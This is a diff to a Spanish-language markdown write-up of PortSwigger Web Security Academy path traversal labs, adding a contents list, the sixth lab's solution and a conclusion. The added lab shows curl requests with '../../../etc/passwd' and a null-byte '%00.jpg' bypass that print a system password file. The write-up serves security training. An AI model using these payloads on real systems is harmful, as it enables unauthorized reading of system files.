@@ -12,7 +12,21 @@ Todos los laboratorios posteriormente expuestos los puedes encontrar para resolv
 
 ## Índice
 
+  * [1. Lab: File path traversal, simple case](#1-lab-file-path-traversal-simple-case)
 
+  * [2. Lab: File path traversal, traversal sequences blocked with absolute path bypass](#2-lab-file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass)
+
+  * [3. Lab: File path traversal, traversal sequences stripped non-recursively](#3-lab-file-path-traversal--traversal-sequences-stripped-non-recursively)
+
+  * [4. Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](#4-lab-file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode)
+
+  * [5. Lab: File path traversal, validation of start of path](#5-lab-file-path-traversal-validation-of-start-of-path)
+
+  * [6. Lab: File path traversal, validation of file extension with null byte bypass](#6-lab-file-path-traversal-validation-of-file-extension-with-null-byte-bypass)
+
+  * [CONCLUSION](#conclusion)
+
+    
 
 ## 1. Lab: File path traversal, simple case
 
@@ -193,4 +207,31 @@ sync:x:4:65534:sync:/bin:/bin/sync
 ```
 
 ## 6. Lab: File path traversal, validation of file extension with null byte bypass
+
+```bash
+https://acf81f211eab79d0809c602c005a00d3.web-security-academy.net/image?filename=10.jpg
+```
+
+Intentaremos con unos de los payloads anteriores, y vemos que es lo que ocurre.
+
+```bash
+└──╼ $curl 'https://acf81f211eab79d0809c602c005a00d3.web-security-academy.net/image?filename=../../../etc/passwd'
+"No such file"
+```
+
+Al parecer no nos permite acceder, como dice el titulo del laboratorio, esta web valida la extension del fichero que se le pasa, entonces intentaremos evadir esta restriccion con un caracter nulo, pero en urlencode, el cual sería: **%00**.
+
+```bash
+└──╼ $curl 'https://acf81f211eab79d0809c602c005a00d3.web-security-academy.net/image?filename=../../../etc/passwd%00.jpg'
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+....
+```
+
+## CONCLUSION
+
+Y con esto acabamos la seccion de Directory Traversal, usa seccion muy sencilla y con pocos laboratorios pero que nos va ciertos trucos muy utiles para evadir algunas restricciones que nos dé algun sitio.
 
